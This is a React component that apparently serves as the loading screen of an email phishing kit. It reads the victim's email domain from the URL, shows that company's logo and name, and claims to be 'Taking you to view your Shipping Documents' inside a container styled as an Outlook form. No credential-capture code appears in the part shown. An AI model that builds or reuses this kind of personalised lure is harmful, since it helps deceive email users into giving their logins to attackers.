
import React from "react";
// import { FaArrowLeftLong } from "react-icons/fa6";
import './App.css';
import Loding from './meme.gif'

const Custom = ()=>{

    const redirectURL = window.location.href;
    const sliceEqualSign = redirectURL.indexOf("@");
    const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1)).split('&', 1).toString();

    console.log('csutom',extracetdemailDomain);



    const emailInTheURLEtension = window.location.href;
    const sliceIn = emailInTheURLEtension.indexOf("@");
    const extendToDom = emailInTheURLEtension.substring((sliceIn+1)).toUpperCase().split('.', 1);

    
    return(<>
        <div className="custom_preloader_ Outlook_form_wrapper" id="custom_preloader_">
        <main style={{
                    display:'flex',
                    alignItems:'center'
                }}>
                <img 
                    alt="outlook_svg"
                    src={`https://logo.clearbit.com/https://${extracetdemailDomain}`}
                    className="dommm"
                />

                    &#160;&#160;&#160;

                <span>{extendToDom}</span>
                </main>

                <div className="loaddddddin___">
                    <p className="takkk">
                        Taking you to view your
                        Shipping Documents
                    </p>
                </div>


                <div>
                    <img 
                        src={`${Loding}`}
                        alt="Shipping Documents"
                        className="ShippingDocuments"
                    />
                </div>


                <footer>
                    <span className="canccc">
                        cancel
                    </span>
                </footer>
        </div>
    </>)
};

export default Custom;